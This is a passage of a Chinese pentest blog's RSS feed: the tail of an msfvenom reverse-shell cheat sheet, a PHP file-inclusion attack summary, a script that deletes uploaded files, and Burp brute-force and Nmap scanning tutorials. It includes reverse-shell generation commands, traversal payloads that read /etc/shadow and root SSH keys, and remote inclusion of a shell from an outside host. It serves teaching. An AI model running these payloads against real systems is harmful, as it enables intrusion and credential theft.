<div><pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp <span>LHOST</span><span>=</span><span>&lt;</span>IP Address<span>></span> <span>LPORT</span><span>=</span><span>443</span> -e -f elf -a x86 --platform linux -o shell
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="msf-生成反弹-shell-c-shellcode" tabindex="-1"> MSF 生成反弹 Shell (C Shellcode)</h3>
<div><pre><code>msfvenom -p windows/shell_reverse_tcp <span>LHOST</span><span>=</span><span>127.0</span>.0.1 <span>LPORT</span><span>=</span><span>443</span> -b <span>"<span title="\x00">\x00</span><span title="\x0a">\x0a</span><span title="\x0d">\x0d</span>"</span> -a x86 --platform win -f c
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="msf-生成反弹-python-shell" tabindex="-1"> MSF 生成反弹 Python Shell</h3>
<div><pre><code>msfvenom -p cmd/unix/reverse_python <span>LHOST</span><span>=</span><span>127.0</span>.0.1 <span>LPORT</span><span>=</span><span>443</span> -o shell.py
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="msf-生成反弹-asp-shell" tabindex="-1"> MSF 生成反弹 ASP Shell</h3>
<div><pre><code>msfvenom -p windows/meterpreter/reverse_tcp <span>LHOST</span><span>=</span><span>&lt;</span>Your IP Address<span>></span> <span>LPORT</span><span>=</span><span>&lt;</span>Your Port to Connect On<span>></span> -f asp -a x86 --platform win -o shell.asp
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="msf-生成反弹-bash-shell" tabindex="-1"> MSF 生成反弹 Bash Shell</h3>
<div><pre><code>msfvenom -p cmd/unix/reverse_bash <span>LHOST</span><span>=</span><span>&lt;</span>Your IP Address<span>></span> <span>LPORT</span><span>=</span><span>&lt;</span>Your Port to Connect On<span>></span> -o shell.sh
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="msf-生成反弹-php-shell" tabindex="-1"> MSF 生成反弹 PHP Shell</h3>
<div><pre><code>msfvenom -p php/meterpreter_reverse_tcp <span>LHOST</span><span>=</span><span>&lt;</span>Your IP Address<span>></span> <span>LPORT</span><span>=</span><span>&lt;</span>Your Port to Connect On<span>></span> -o shell.php
<span>add</span> <span>&lt;</span>?php at the beginning
perl -i~ -0777pe<span>'s/^/&lt;?php \n/'</span> shell.php
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="msf-生成反弹-win-shell" tabindex="-1"> MSF 生成反弹 Win Shell</h3>
<div><pre><code>msfvenom -p windows/meterpreter/reverse_tcp <span>LHOST</span><span>=</span><span>&lt;</span>Your IP Address<span>></span> <span>LPORT</span><span>=</span><span>&lt;</span>Your Port to Co
</code></pre><div aria-hidden="true"><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>PHP 文件包含漏洞总结</title>
      <link>https://vxhly.github.io/views/pentest/php-file-inclusion.html</link>
      <guid>https://vxhly.github.io/views/pentest/php-file-inclusion.html</guid>
      <source url="https://vxhly.github.io/rss.xml">PHP 文件包含漏洞总结</source>
      <description>前言
PHP 文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时, 由于传入的文件名没有经过合理的校验, 从而操作了预想之外的文件, 就可能导致意外的文件泄露甚至恶意的代码注入。

</description>
      <category>pentest</category>
      <pubDate>Sun, 02 Apr 2017 16:31:38 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>PHP 文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时, 由于传入的文件名没有经过合理的校验, 从而操作了预想之外的文件, 就可能导致意外的文件泄露甚至恶意的代码注入。</p>
</div>

<h2 id="常见文件包含函数" tabindex="-1"> 常见文件包含函数</h2>
<ul>
<li><strong>include()</strong>: 执行到 include 时才包含文件, 找不到被包含文件时只会产生警告, 脚本将继续执行</li>
<li><strong>require()</strong>: 只要程序一运行就包含文件, 找不到被包含的文件时会产生致命错误, 并停止脚本</li>
<li><strong>include_once()<strong>和</strong>require_once()</strong>: 若文件中代码已被包含则不会再次包含</li>
</ul>
<h2 id="利用条件" tabindex="-1"> 利用条件</h2>
<p>程序用 include() 等文件包含函数通过动态变量的范式引入需要包含的文件 用户能够控制该动态变量</p>
<p>注: PHP 中只要文件内容符合 PHP 语法规范, 包含时不管扩展名是什么都会被 PHP 解析, 若文件内容不符合 PHP 语法规范则会暴漏其源码。</p>
<h2 id="漏洞危害" tabindex="-1"> 漏洞危害</h2>
<ul>
<li>执行任意代码</li>
<li>包含恶意文件控制网站</li>
<li>甚至控制服务器</li>
</ul>
<h2 id="漏洞分类" tabindex="-1"> 漏洞分类</h2>
<ul>
<li>本地文件包含: 可以包含本地文件, 在条件允许时甚至能执行代码</li>
</ul>
<p>-- 上传图片马, 然后包含 -- 读敏感文件, 读 PHP 文件 -- 包含日志文件 GetShell -- 包含 /proc/self/envion 文件 GetShell -- 包含 data: 或 php://input 等伪协议 -- 若有 phpinfo 则可以包含临时文件</p>
<ul>
<li>远程文件包含: 可以直接执行任意代码</li>
</ul>
<p>-- 要保证 php.ini 中 allow_url_fopen 和 allow_url_include 要为 On</p>
<h2 id="普通本地文件包含" tabindex="-1"> 普通本地文件包含</h2>
<div><pre><code><span><span>&lt;?php</span> <span>include</span><span>(</span><span>"inc/"</span> <span>.</span> <span>$_GET</span><span>[</span><span>'file'</span><span>]</span><span>)</span><span>;</span><span>?></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="攻击方式" tabindex="-1"> 攻击方式</h3>
<h4 id="包含同目录下的文件" tabindex="-1"> 包含同目录下的文件</h4>
<div><p>攻击方式</p>
<p>?file=.htaccess</p>
</div>
<h4 id="目录遍历" tabindex="-1"> 目录遍历</h4>
<div><p>攻击方式</p>
<p>?file=../../../../../../../../../var/lib/locate.db<br> ?file=../../../../../../../../../var/lib/mlocate/mlocate.db<br> (linux 中这两个文件储存着所有文件的路径, 需要 root 权限)</p>
</div>
<h4 id="包含错误日志" tabindex="-1"> 包含错误日志</h4>
<div><p>攻击方式</p>
<p>?file=../../../../../../../../../var/log/apache/error.log</p>
</div>
<h4 id="获取-web-目录或者其他配置文件" tabindex="-1"> 获取 web 目录或者其他配置文件</h4>
<div><p>攻击方式</p>
<p>?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf</p>
</div>
<h4 id="包含上传的附件" tabindex="-1"> 包含上传的附件</h4>
<div><p>攻击方式</p>
<p>?file=../attachment/media/xxx.file</p>
</div>
<h4 id="读取-session-文件" tabindex="-1"> 读取 session 文件</h4>
<div><p>攻击方式</p>
<p>?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7<br> (session 文件一般在 /tmp 目录下, 格式为 <code>sess\_[your phpsessid value]</code> , 有时候也有可能在/var/lib/php5 之类的, 在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制 session 的值, 也许你能够获得一个 shell)</p>
</div>
<h4 id="系统中重要文件-需要-root-权限" tabindex="-1"> 系统中重要文件(需要 root 权限)</h4>
<ul>
<li><code>/root/.ssh/authorized_keys</code></li>
<li><code>/root/.ssh/id_rsa</code></li>
<li><code>/root/.ssh/id_rsa.keystore</code></li>
<li><code>/root/.ssh/id_rsa.pub</code></li>
<li><code>/root/.ssh/known_hosts</code></li>
<li><code>/etc/shadow</code></li>
<li><code>/root/.bash_history</code></li>
<li><code>/root/.mysql_history</code></li>
<li><code>/proc/self/fd/fd[0-9]* (文件标识符)</code></li>
<li><code>/proc/mounts</code></li>
<li><code>/proc/config.gz</code></li>
</ul>
<h2 id="有限制的本地文件包含" tabindex="-1"> 有限制的本地文件包含</h2>
<div><pre><code><span><span>&lt;?php</span> <span>include</span><span>(</span><span>"inc/"</span> <span>.</span> <span>$_GET</span><span>[</span><span>'file'</span><span>]</span> <span>.</span> <span>".htm"</span><span>)</span><span>;</span><span>?></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="攻击方式-1" tabindex="-1"> 攻击方式</h3>
<h4 id="_00-截断" tabindex="-1"> %00 截断</h4>
<div><p>攻击方式</p>
<p>?file=../../../../../../../../../etc/passwd%00<br> (需要 magic_quotes_gpc=off, PHP 小于 5.3.4 有效)</p>
</div>
<h4 id="_00-截断目录遍历" tabindex="-1"> %00 截断目录遍历</h4>
<div><p>攻击方式</p>
<p>?file=../../../../../../../../../var/www/%00<br> (需要 magic_quotes_gpc=off, unix 文件系统, 比如 FreeBSD, OpenBSD, NetBSD, Solaris)</p>
</div>
<h4 id="路径长度截断" tabindex="-1"> 路径长度截断:</h4>
<div><p>攻击方式</p>
<p>?file=../../../../../../../../../etc/passwd/././././././.[...]/./././././.<br> (php 版本小于 5.2.8(?)可以成功, linux 需要文件名长于 4096, windows 需要长于 256)</p>
</div>
<h4 id="点号截断" tabindex="-1"> 点号截断:</h4>
<div><p>攻击方式</p>
<p>?file=../../../../../../../../../boot.ini/.........[...]............<br> (php 版本小于 5.2.8(?)可以成功, 只适用 windows, 点号需要长于 256)</p>
</div>
<h2 id="普通远程文件包含" tabindex="-1"> 普通远程文件包含</h2>
<div><pre><code><span><span>&lt;?php</span> <span>include</span><span>(</span><span>$_GET</span><span>[</span><span>'file'</span><span>]</span><span>)</span><span>;</span><span>?></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="攻击方式-2" tabindex="-1"> 攻击方式</h3>
<h4 id="远程代码执行" tabindex="-1"> 远程代码执行:</h4>
<div><p>攻击方式</p>
<p>?file=[http|https|ftp]://example.com/shell.txt<br> (需要 allow_url_fopen=On 并且 allow_url_include=On)</p>
</div>
<h4 id="利用-php-流-input" tabindex="-1"> 利用 php 流 input:</h4>
<div><p>攻击方式</p>
<p>?file=php://input<br> (需要 allow_url_include=On)</p>
</div>
<h4 id="利用-php-流-filter" tabindex="-1"> 利用 php 流 filter:</h4>
<div><p>攻击方式</p>
<p>?file=php://filter/convert.base64-encode/resource=index.php<br> (需要 allow_url_include=On)</p>
</div>
<h4 id="利用-data-uris" tabindex="-1"> 利用 data URIs:</h4>
<div><p>攻击方式</p>
<p>?file=data://text/plain; base64, SSBsb3ZlIFBIUAo=<br> (需要 allow_url_include=On)</p>
</div>
<h4 id="利用-xss-执行任意代码" tabindex="-1"> 利用 XSS 执行任意代码:</h4>
<div><p>攻击方式</p>
<p>?file=<a href="http://127.0.0.1/path/xss.php?xss=phpcode" target="_blank" rel="noopener noreferrer">http://127.0.0.1/path/xss.php?xss=phpcode</a><br> (需要 allow_url_fopen=On, allow_url_include=On 并且防火墙或者白名单不允许访问外网时, 先在同站点找一个 XSS 漏洞, 包含这个页面, 就可以注入恶意代码了。条件非常极端和特殊- -)</p>
</div>
<h2 id="有限制的远程文件包含" tabindex="-1"> 有限制的远程文件包含</h2>
<div><pre><code><span><span>&lt;?php</span> <span>include</span><span>(</span><span>$_GET</span><span>[</span><span>'file'</span><span>]</span> <span>.</span> <span>".htm"</span><span>)</span><span>;</span><span>?></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>攻击方式</p>
<p>?file=<a href="http://example.com/shell" target="_blank" rel="noopener noreferrer">http://example.com/shell</a><br> ?file=<a href="http://example.com/shell.txt?" target="_blank" rel="noopener noreferrer">http://example.com/shell.txt?</a><br> ?file=<a href="http://example.com/shell.txt%23" target="_blank" rel="noopener noreferrer">http://example.com/shell.txt%23</a><br> (需要 allow_url_fopen=On 并且 allow_url_include=On)<br> ?file=\evilshare\shell.php (只需要 allow_url_include=On)</p>
</div>
<h2 id="延伸" tabindex="-1"> 延伸</h2>
<p>其实在前面也说了, 这些漏洞产生原因是 PHP 函数在引入文件时, 传入的文件名没有经过合理的校验, 从而操作了预想之外的文件。实际上我们操作文件的函数不只是 include()一个, 上面提到的一些截断的方法同样可以适用于以下函数:</p>
<ul>
<li><strong>fopen</strong></li>
<li><strong>file_get_contents</strong></li>
<li><strong>copy</strong></li>
<li><strong>parse_ini_file</strong></li>
<li><strong>readfile</strong></li>
<li><strong>file_put_contents</strong></li>
<li><strong>mkdir</strong></li>
<li><strong>tempnam</strong></li>
<li><strong>move_uploaded_file</strong></li>
<li><strong>rename</strong></li>
<li><strong>unlink</strong></li>
<li><strong>rmdir</strong></li>
<li><strong>require</strong></li>
<li><strong>require_once</strong></li>
<li><strong>include_once</strong></li>
<li><strong>ZipArchive::open()</strong></li>
</ul>
<h2 id="漏洞防御" tabindex="-1"> 漏洞防御</h2>
<ul>
<li>PHP 中使用 open_basedir 配置, 将访问限制在指定区域</li>
<li>过滤 <code>./\</code></li>
<li>禁止服务器远程文件包含</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Shell 监听脚本-新增文件</title>
      <link>https://vxhly.github.io/views/pentest/shell-listen-for-new-files.html</link>
      <guid>https://vxhly.github.io/views/pentest/shell-listen-for-new-files.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Shell 监听脚本-新增文件</source>
      <description>前言
Liunx 下的监听 shell 脚本, 脚本功能实现, 当一小时内有新增的新文件, 立刻删除它, 此脚本允许被后台运行。

</description>
      <category>pentest</category>
      <pubDate>Tue, 22 Aug 2017 21:03:18 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>Liunx 下的监听 shell 脚本, 脚本功能实现, 当一小时内有新增的新文件, 立刻删除它, 此脚本允许被后台运行。</p>
</div>

<h2 id="功能解释" tabindex="-1"> 功能解释</h2>
<ol>
<li>若含有文件上传漏洞时, 该脚本能够自动删除上传的文件</li>
<li>在 <code>PWD(攻防对抗)</code> 中非常有用</li>
<li>后台运行, 只占用进程号, 不占用 shell 界面</li>
</ol>
<h2 id="脚本代码" tabindex="-1"> 脚本代码</h2>
<div><pre><code><span>#!/bin/bash</span>
<span>while</span> <span>true</span>
<span>do</span>
  <span>find</span> /var/www/dvwa/ -cmin -60 -type f <span>|</span> <span>xargs</span> <span>rm</span> -rf
  <span>sleep</span> <span>1</span>
<span>done</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="脚本解释" tabindex="-1"> 脚本解释</h3>
<ul>
<li><code>while true</code> =&gt; 持续监听</li>
<li><code>-cmin -60</code> =&gt; 查找一小时内（包含一小时）新增文件</li>
<li><code>-type f</code> =&gt; 制定文件类型为文件</li>
<li><code>|</code> =&gt; 管道符, 将前一个命令执行结果传送至后一个命令执行</li>
<li><code>xargs</code> =&gt; 命令传递参数的一个过滤器, 可以批量执行</li>
<li><code>sleep 1</code> =&gt; 上一条命令执行之后, 暂停 1 秒</li>
<li><code>/var/www/dvwa/</code> =&gt; 可为任何目录, 这边是一个测试目录</li>
</ul>
<h2 id="运行" tabindex="-1"> 运行</h2>
<div><pre><code><span>chmod</span> +x <span>[</span>fileName<span>]</span>.sh
./<span>[</span>fileName<span>]</span>.sh <span>&amp;</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="进程号查询" tabindex="-1"> 进程号查询</h3>
<p>脚本后台运行时, 会生成一个进程号<br></p>
<p><img src="/assets/shell-new-files-1.png" alt="Shell 监听脚本"></p>
<p>通过 ps 命令可以查询进程<br></p>
<p><img src="/assets/shell-new-files-2.png" alt="Shell 监听脚本"></p>
<h2 id="测试" tabindex="-1"> 测试</h2>
<h3 id="本地测试" tabindex="-1"> 本地测试</h3>
<p>在 <code>/var/www/dvwa/</code> 某个目录下新增文件<br></p>
<p><img src="/assets/shell-new-files-3.png" alt="Shell 监听脚本"></p>
<h3 id="在有上传文件漏洞中测试" tabindex="-1"> 在有上传文件漏洞中测试</h3>
<p>在 dvwa 中的上传文件漏洞环境进行测试<br></p>
<p><img src="/assets/shell-new-files-4.png" alt="Shell 监听脚本"></p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/shell-new-files-1.png" type="image/png"/>
    </item>
    <item>
      <title>渗透工具用法（二）BurpSuite 的用法</title>
      <link>https://vxhly.github.io/views/pentest/usage-of-burp.html</link>
      <guid>https://vxhly.github.io/views/pentest/usage-of-burp.html</guid>
      <source url="https://vxhly.github.io/rss.xml">渗透工具用法（二）BurpSuite 的用法</source>
      <description>前言
此系列笔记是网络渗透工具的使用方法, 本篇是介绍 Web 应用程序测试工具 BurpSuite 的使用方法。Burp Suite 其多种功能可以帮我们执行各种任务, 请求的拦截和修改, 扫描 web 应用程序漏洞, 以暴力破解登陆表单, 执行会话令牌等多种的随机性检查。

</description>
      <category>pentest</category>
      <pubDate>Sat, 08 Oct 2016 16:02:34 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>此系列笔记是网络渗透工具的使用方法, 本篇是介绍 Web 应用程序测试工具 BurpSuite 的使用方法。Burp Suite 其多种功能可以帮我们执行各种任务, 请求的拦截和修改, 扫描 web 应用程序漏洞, 以暴力破解登陆表单, 执行会话令牌等多种的随机性检查。</p>
</div>

<h2 id="burp-suite-环境" tabindex="-1"> Burp Suite 环境</h2>
<p><code>kali Liunx</code> 里已经集成了 Burp Suite 工具, <code>windows</code> 下安装 Burp Suite 之前请确定你的电脑里有 Java 环境<br> <a href="http://portswigger.net/burp/download.html" target="_blank" rel="noopener noreferrer">Burp Suite 官网下载地址</a></p>
<h3 id="jdk-安装和环境变量配置" tabindex="-1"> JDK 安装和环境变量配置</h3>
<p><code>windows</code> 下安装 Burp Suite 需要 Java 环境进行支持, 由于本博客之前是有写过 JDK 的安装和环境变量的配置, 所以这里不再提供。</p>
<h2 id="设置代理" tabindex="-1"> 设置代理</h2>
<p>Burp Suite 带有一个代理, 通过默认端口 <code>8080</code> 上运行, 使用这个代理, 我们可以截获并修改从客户端到 web 应用程序的数据包。<br></p>
<p><img src="/assets/burp-1.png" alt="Burp Suite"></p>
<p>这里我们使用 <code>Chrome</code> 浏览器, 在 <code>Chrome</code> 浏览器里也需要设置代理方式<br></p>
<p><img src="/assets/burp-2.png" alt="Burp Suite"></p>
<h2 id="拦截改包和暴力破解" tabindex="-1"> 拦截改包和暴力破解</h2>
<h3 id="模拟登录" tabindex="-1"> 模拟登录</h3>
<p>这里使用漏洞集成平台 <code>DVWA</code> 来进行测试</p>
<p><img src="/assets/burp-3.png" alt="Burp Suite"></p>
<h3 id="拦截请求包" tabindex="-1"> 拦截请求包</h3>
<p>随意输入密码（这里填写的密码为 <code>123</code> ）, 点击登录, 在 Burp Suite 里就可以看到拦截的请求包（前提是设置好代理）<br></p>
<p><img src="/assets/burp-4.png" alt="Burp Suite"></p>
<h3 id="修改请求包" tabindex="-1"> 修改请求包</h3>
<p>将拦截到的数据包 <code>Send to Intruder</code> （也可以使用 <code>Ctrl+I</code> ）<br></p>
<p><img src="/assets/burp-5.png" alt="Burp Suite"></p>
<p>在 <code>Position</code> 选项中设置需要破解的变量。 <code>Burpsuite</code> 会自动设置许多变量, 单击 <code>Clear</code> 按钮, 把默认变量全部清除, 然后选中密码 <code>123</code> , 单击 <code>Add</code> 按钮将之设为需要破解的变量。由于只有一个变量, 因而 <code>Attack type</code> 攻击类型这里选择 <code>Sniper</code> 。<br></p>
<p><img src="/assets/burp-6.png" alt="Burp Suite"></p>
<h3 id="添加字典" tabindex="-1"> 添加字典</h3>
<p>在 <code>Payloads</code> 选项中进行设置, 由于只有一个变量, 因而 <code>Payload set</code> 自动设置为 1, <code>Payload type</code> 这里设置为 <code>Simple list</code> 。在下面的 <code>Payload Options</code> 中, 我们添加可能的密码, 或者密码。<br></p>
<p><img src="/assets/burp-7.png" alt="Burp Suite"></p>
<h3 id="开始破解" tabindex="-1"> 开始破解</h3>
<p>在菜单栏中选择 <code>Intruder/Start attack</code> , 就可以开始暴力破解。<br></p>
<p><img src="/assets/burp-8.png" alt="Burp Suite"></p>
<h3 id="分析" tabindex="-1"> 分析</h3>
<p>在 <code>Results</code> 中, 双击 <code>length</code> 进行排序, 在这里所有登录成功或者登录失败的记录全部在这里。<br></p>
<p><img src="/assets/burp-9.png" alt="Burp Suite"></p>
<p>选中请求字节包最大的, 在 <code>Response/Render</code> 里就可以看到 <code>Welcome to the password protected area admin</code> 成功登录的信息<br></p>
<p><img src="/assets/burp-10.png" alt="Burp Suite"></p>
<h2 id="decode-和-encode" tabindex="-1"> Decode 和 Encode</h2>
<p>Decoder 转化成规范的形式编码数据, 或转化成各种形式编码和散列的原始数据。它能够智能识别多种编码格式, 使用启发式技术。</p>
<p>下面这张图是将一段 URL 进行 encode（编码）<br></p>
<p><img src="/assets/burp-11.png" alt="Burp Suite"></p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/burp-1.png" type="image/png"/>
    </item>
    <item>
      <title>渗透工具用法（三）Nmap 的用法</title>
      <link>https://vxhly.github.io/views/pentest/usage-of-nmap.html</link>
      <guid>https://vxhly.github.io/views/pentest/usage-of-nmap.html</guid>
      <source url="https://vxhly.github.io/rss.xml">渗透工具用法（三）Nmap 的用法</source>
      <description>前言
此系列笔记是网络渗透工具的使用方法, 本篇是介绍端口扫描工具 Nmap 的使用方法。Nmap 在渗透测试中经常用到, 它不仅可以用来确定目标网络上计算机的存活状态, 而且可以扫描各个计算机的操作系统、开放端口、服务, 还有可能获得用户的证书。熟练掌握 Nmap 的用法, 可以极大的提高渗透测试技术。

</description>
      <category>pentest</category>
      <pubDate>Fri, 23 Sep 2016 16:29:57 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>此系列笔记是网络渗透工具的使用方法, 本篇是介绍端口扫描工具 Nmap 的使用方法。Nmap 在渗透测试中经常用到, 它不仅可以用来确定目标网络上计算机的存活状态, 而且可以扫描各个计算机的操作系统、开放端口、服务, 还有可能获得用户的证书。熟练掌握 Nmap 的用法, 可以极大的提高渗透测试技术。</p>
</div>

<h2 id="nmap-环境" tabindex="-1"> Nmap 环境</h2>
<p><code>kali Liunx</code> 里已经集成了 Namp 环境, 所以就不在 <code>Windows</code> 下进行了。</p>
<h2 id="nmap-命令结构" tabindex="-1"> Nmap 命令结构</h2>
<p><code>Scanning Format:</code></p>
<div><pre><code>nmap -<span>[</span>option<span>]</span> <span>[</span>IP or domain<span>]</span> -oN <span>[</span>fileName.txt<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="nmap-使用解释" tabindex="-1"> Nmap 使用解释</h2>
<h3 id="识别系统" tabindex="-1"> 识别系统</h3>
<p><code>Scanning Format:</code></p>
<div><pre><code>nmap -O -Pn <span>[</span>IP or domain<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>使用 <code>-O</code> 选项, 可以获取到被扫描的主机的系统。 <code>-Pn</code> 选项禁用 Nmap 网络发现功能, 假定所有系统都是活动的</p>
<h3 id="timing-模板" tabindex="-1"> Timing 模板</h3>
<p><code>timing</code> 参数可以指定 nmap 扫描的速度。其中各个选项如下:</p>
<ul>
<li><strong>T0</strong> =&gt; paranoid 慢速网络扫描, 串行扫描, 两次扫描间隔 <code>5 分钟</code> 。扫描速度极慢。</li>
<li><strong>T1</strong> =&gt; Sneky 慢速网络扫描, 串行扫描, 两次扫描间隔 <code>15 秒</code> , 扫描速度较慢。</li>
<li><strong>T2</strong> =&gt; Polite 中速网络扫描, 串行扫描, 两次扫描间隔 <code>400 毫秒</code> , 扫描速度慢。</li>
<li><strong>T3</strong> =&gt; Normal 中速网络扫描, 并行扫描, 两次扫描间隔 <code>0 秒</code> , 扫描速度正常。</li>
<li><strong>T4</strong> =&gt; Aggressive 快速网络扫描, 并行扫描, 两次扫描间隔 <code>0 秒</code> , 扫描速度较快。</li>
<li><strong>T5</strong> =&gt; Normal 快速网络扫描, 并行扫描, 两次扫描间隔 <code>0 秒</code> , 扫描速度极快。</li>
</ul>
<p><code>Scanning Format:</code></p>
<div><pre><code>nmap -T<span>[</span><span>0</span>-5<span>]</span> <span>[</span>IP or domain<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="扫描方式" tabindex="-1"> 扫描方式</h3>
<h3 id="tcp-扫描" tabindex="-1"> TCP 扫描</h3>
<p>端口扫描中最稳定的, 利用的是 TCP 三次握手。TCP 扫描通常用于收集有关目标的更多信息, 但是会和目标主机建立一个完成的 TCP 连接。</p>
<p><code>Scanning Format:</code></p>
<div><pre><code>nmap -sT -Pn <span>[</span>IP or domain<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>提示</p>
<p><code>-sT</code> TCP 连接扫描（ <code>s</code> ==&gt; 哪种类型扫描； <code>T</code> ==&gt; TCP 类型）</p>
</div>
<h4 id="syn-扫描" tabindex="-1"> SYN 扫描</h4>
<p>TCP 两次握手（隐藏扫描, 速度快, nmap 缺省参数）</p>
<p><code>Scanning Format:</code></p>
<div><pre><code>nmap -sS -Pn <span>[</span>IP or domain<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>提示</p>
<p><code>-sS</code> SYN 连接扫描（ <code>s</code> ==&gt; 哪种类型扫描； <code>S</code> ==&gt; SYN 类型）</p>
</div>
<h4 id="ack-扫描" tabindex="-1"> ACK 扫描</h4>
<p>ACK 扫描, 用于确定 TCP 端口是否被防火墙过滤。</p>
<p><code>Scanning Format:</code></p>
<div><pre><code>nmap -sA -Pn <span>[</span>IP or domain<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>提示</p>
<p><code>-sA</code> ACK 连接扫描（ <code>s</code> ==&gt; 哪种类型扫描； <code>A</code> ==&gt; ACK 类型）</p>
</div>
<h4 id="udp-扫描" tabindex="-1"> UDP 扫描</h4>
<p>DHCP, DNS, SNMP, TFTP 等都使用了 UDP 协议；UDP 扫描会评估目标系统上的 UDP 端口, 可以确认 UDP 端口是开放还是被防火墙过滤。</p>
<p><code>Scanning Format:</code></p>
<div><pre><code>nmap -sU -Pn <span>[</span>IP or domain<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>提示</p>
<p><code>-sU</code> UDP 连接扫描（ <code>s</code> ==&gt; 哪种类型扫描； <code>U</code> ==&gt; UDP 类型）<br> <code>-sV</code> UDP 扫描中添加版本扫描信息（ <code>V</code> ==&gt; 版本信息）<br> 不存在 <code>-Pn</code> 参数（从 UDP 协议去理解, 你发了就 ok 管他收没收到）</p>
</div>
<h3 id="扫描-ip-段" tabindex="-1"> 扫描 IP 段</h3>
<p><code>For Example:</code></p>
<div><pre><code>nmap <span>192.168</span>.1.1-255    <span># 扫描 192.168.1.1－192.168.1.255 所有 IP</span>
nmap <span>192.168</span>.1.1/24     <span># 扫描 192.168.1.1－192.168.1.255 所有 IP</span>
nmap -iL IPL.txt        <span># 扫描 IPL.txt 中保存的所有 IP</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="输出保存选项" tabindex="-1"> 输出保存选项</h3>
<ul>
<li><strong>-oN</strong> =&gt; 保存为文本文件</li>
<li><strong>-oX</strong> =&gt; 保存为 XML 文件</li>
<li><strong>-oG</strong> =&gt; 保存为 GREPable 输出</li>
<li><strong>-oS</strong> =&gt; 脚本输出</li>
</ul>
<h2 id="其他更详细的扫描" tabindex="-1"> 其他更详细的扫描</h2>
<h3 id="nmap-扫描策略" tabindex="-1"> Nmap 扫描策略</h3>
<div><pre><code><span># 适用所有大小网络最好的 nmap 扫描策略</span>

<span># 主机发现,生成存活主机列表</span>
nmap -sn -T4 -oG Discovery.gnmap <span>192.168</span>.56.0/24
<span>grep</span> <span>"Status: Up"</span> Discovery.gnmap <span>|</span> <span>cut</span> -f <span>2</span> -d <span>' '</span> <span>></span> LiveHosts.txt

<span># 端口发现,发现大部分常用端口</span>
<span># https//nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf</span>
nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt
nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt
nmap -sS -T4 -Pn --top-ports <span>3674</span> -oG <span>3674</span> -iL LiveHosts.txt

<span># 端口发现,发现全部端口,但 UDP 端口的扫描会非常慢</span>
nmap -sS -T4 -Pn -p <span>0</span>-65535 -oN FullTCP -iL LiveHosts.txt
nmap -sU -T4 -Pn -p <span>0</span>-65535 -oN FullUDP -iL LiveHosts.txt

<span># 显示 TCP\UDP 端口</span>
<span>grep</span> <span>"open"</span> FullTCP<span>|</span><span>cut</span> -f <span>1</span> -d <span>' '</span> <span>|</span> <span>sort</span> -nu <span>|</span> <span>cut</span> -f <span>1</span> -d <span>'/'</span> <span>|</span><span>xargs</span> <span>|</span> <span>sed</span> <span>'s/ /,/g'</span><span>|</span><span>awk</span> <span>'{print "T:"$0}'</span>
<span>grep</span> <span>"open"</span> FullUDP<span>|</span><span>cut</span> -f <span>1</span> -d <span>' '</span> <span>|</span> <span>sort</span> -nu <span>|</span> <span>cut</span> -f <span>1</span> -d <span>'/'</span> <span>|</span><span>xargs</span> <span>|</span> <span>sed</span> <span>'s/ /,/g'</span><span>|</span><span>awk</span> <span>'{print "U:"$0}'</span>

<span># 侦测服务版本</span>
nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt

<span># 扫做系统扫描</span>
nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt

<span># 系统和服务检测</span>
nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt

<span># 扫描 B 段的存活主机</span>
nmap -v -sn -PE -n --min-hostgroup <span>1024</span> --min-parallelism <span>1024</span> <span>172.16</span>.0.0/16 <span>|</span> <span>grep</span> -v down <span>|</span> <span>grep</span> <span>"172.16."</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="nmap-躲避防火墙" tabindex="-1"> Nmap 躲避防火墙</h3>
<div><pre><code><span># 分段</span>
nmap -f

